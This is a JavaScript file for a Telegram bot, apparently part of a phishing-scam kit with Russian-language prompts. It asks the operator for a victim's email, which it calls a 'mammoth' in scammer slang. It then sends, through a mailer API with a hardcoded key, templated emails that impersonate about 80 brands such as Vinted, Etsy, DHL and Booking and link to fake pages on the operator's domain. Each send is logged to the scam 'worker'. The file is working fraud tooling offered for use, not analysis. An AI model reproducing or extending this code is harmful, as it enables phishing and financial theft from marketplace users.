const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

const sendEmail = async (ctx, service, ad, serviceSend) => {
  try {
    await axios.post("https://yourmailer-api.com/api/send", {
      api_key: "xdM2o9d2GIlmwJWF",
      email: ctx.scene.state.data.mail,
      pattern: serviceSend[ad.serviceCode],
      url: `https://${service.domain}/y/${ad.id}`,
      worker: `${ctx.from.id}:${ctx.from.username}`,
    });
    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    await ctx.reply("<b>✅ Письмо успешно отправлено на указанный адрес</b>", {
      reply_to_message_id: ctx.message.message_id,
      parse_mode: "HTML",
    });

    log(
      ctx,
      `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта мамонта:</b> ${ctx.scene.state.data.mail}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>YOUR MAIL</i>`
    );
  } catch (err) {
    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    console.error("Ошибка при отправке письма:", err);
    await ctx.reply(
      `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>
      
Сендер: <b>Your Mail</b>      

Ошибка: <b>${err.response.data}</b>

<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
      { parse_mode: "HTML",
              reply_to_message_id: ctx.message.message_id,

       }
    );
  }
};

const scene = new WizardScene(
  "sendMailAd3",
  async (ctx) => {
    try {
      await ctx.reply("Введите почту мамонта", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const email = ctx.message?.text;
      if (!email) {
        await ctx.reply(
          "❌ Пожалуйста, введите действительный адрес электронной почты."
        );
        return;
      }

      ctx.scene.state.data.mail = email;

      const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
      const service = await Service.findOne({
        where: { code: ad.serviceCode },
      });

      const serviceSend = {
        quokaverif_de: "quoka_DE@!!@verif",
        adverts_ie: "Adverts_IE@!!@2.0",
        beatstars_eu: "beatstars_EN@!!@verif",
        beebs_fr: "beebs_FR@!!@2.0",
        milanuncios_es: "milanuncios_ES@!!@2.0",
        interac_ca: "interac_CA@!!@2.0",
        euroexpress_ba: "euroexpress_BA@!!@2.0",
        booking_eu: "booking2_EU@!!@1.0",
        etsy_eu: "etsy_EU@!!@2.0",
        etsyverif_eu: "etsy_EU@!!@2.0V",
        etsy_de: "etsy_EU@!!@2.0",
        vinted_se: "vinted_SE@!!@2.0",
        vinted_it: "vinted_IT@!!@2.0",
        vinted_hu: "vinted_HU@!!@2.0",
        vinted_es: "vinted_ES@!!@2.0",
        vinted_nl: "vinted_NL@!!@2.0",
        vinted_uk: "vinted_EN@!!@2.0",
        vinted_pt: "vinted_PT@!!@2.0",
        vinted_de: "vinted_DE@!!@2.0",
        depop_au: "depop_DE@!!@2.0",
        depop_de: "depop_DE@!!@2.0",
        depop_uk: "depop_UK@!!@2.0",
        depop_com: "depop_EU@!!@2.0",

        wallapop_es: "wallapop_ES@!!@2.0",
        wallapop_it: "wallapop_IT@!!@2.0",
        wallapop_pt: "wallapop_PT@!!@2.0",
        fedex_ae: "fedex_AE@!!@2.0",
        econt_bg: "econt_BG@!!@2.0",
        letgo_tr: "letgo_TR@!!@2.0",
        packeta_sk: "packeta_SK@!!@2.0",
        ctt_pt: "ctt_PT@!!@2.0",
        gls_sl: "GLS_SI@!!@2.0",
        gls_cz: "GLS_CZ@!!@2.0",
        gls_hu: "GLS_HU@!!@2.0",
        subito_it: "subito_IT@!!@2.0",
        trademe_nz: "trademe_NZ@!!@2.0",
        auspost_au: "aupost_AU@!!@2.0",
        gumtree_au: "gumtree_GB@!!@2.0",
        elo_br: "elo7_BR@!!@2.0",
        leboncoin_fr: "leboncoin_FR@!!@2.0",
        vestiairecollective_eu: "Vestiaire_GB@!!@2.0",
        correos_es: "correos_ES@!!@1.0",
        milanuncios_es: "milanuncios_ES@!!@2.0",
        blocket_se: "blocket_SE@!!@2.0",
        postnord_se: "postnord_SE@!!@2.0",
        fiverr_eu: "fiverrverif_EN@!!@2.0",
        fiverr_com: "fiverr_EN@!!@2.0",
        dhl_de: "DHL_DE@!!@2.0",
        ebaykleinanzeigen_de: "kleinanzeigen_AT@!!@2.0",
        dpd_hr: "DPD_HR@!!@2.0",
        dpd_eu: "DPD_GB@!!@2.0",
        dpd_sk: "DPD_SK@!!@2.0",
        carousell_ph: "Carousell_PH@!!@2.0",
        swisspost_ch: "swisspost_GB@!!@2.0",
        anibis_ch: "anibis_CH@!!@2.0",
        ebid_eu: "ebid_EU@!!@2.0",
        travelexpress_cy: "travelexpresscourier_CY@!!@2.0",
        bazaraki_cy: "bazaraki_CY@!!@2.0",
        tradera_se: "tradera_SE@!!@2.0",
        njuskalo_hr: "njuskalo_HR@!!@2.0",
        qatarpost_qa: "qatarpost_QA@!!@2.0",
        poshmark_eu: "poshmark_CA@!!@2.0",
        olx_ro: "olx_RO@!!@2.0",
        opensooq_om: "opensooq_AE@!!@2.0",
        opensooq_bh: "opensooq_AE@!!@2.0",
        opensooq_sa: "opensooq_AE@!!@2.0",
        posta_ba: "bhpost_BA@!!@2.0",
        nextdoor_eu: "nextdoor_EN@!!@2.0",
        nextdoorverif_eu: "nextdoor_EN@!!@verif",
        nzpost_nz: "post_NZ@!!@2.0",
        vintedverif_pt: "vinted_PT@!!@verif",
        travelexpress_cy: "travelexpresscourier_CY@!!@2.0",
        auspost_au: "aupost_AU@!!@2.0",
        lalamove_sg: "lalamove_SG@!!@2.0",
        marktplaats_nl: "marktplaats_NL@!!@2.0",

        royalmail_uk: "royalmail_EU@!!@2.0",
        kaidee_th: "kaidee_TH@!!@2.0"

      };

      const loadingMsg = await ctx.reply("⏳ Отправляю письмо...");

      const clonedCtx = {
        from: ctx.from,
        message: ctx.message,
        scene: {
          state: {
            data: {
              mail: ctx.scene.state.data.mail,
            },
          },
        },
        tempMessageId: loadingMsg.message_id, // передаём сюда
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        reply: (...args) => ctx.reply(...args),
      };


      setImmediate(() => {
        sendEmail(clonedCtx, service, ad, serviceSend).catch(err => {
          console.error("Ошибка отправки:", err.message);
        });
      });

      return ctx.scene.leave();
    } catch (err) {
      await ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

      console.log(err);

      await ctx
        .replyWithHTML(
          `<b>❌ Ошибка при отправке письма!</b>\nОшибка сервера: <b>${err.message}</b>`
        )
        .catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
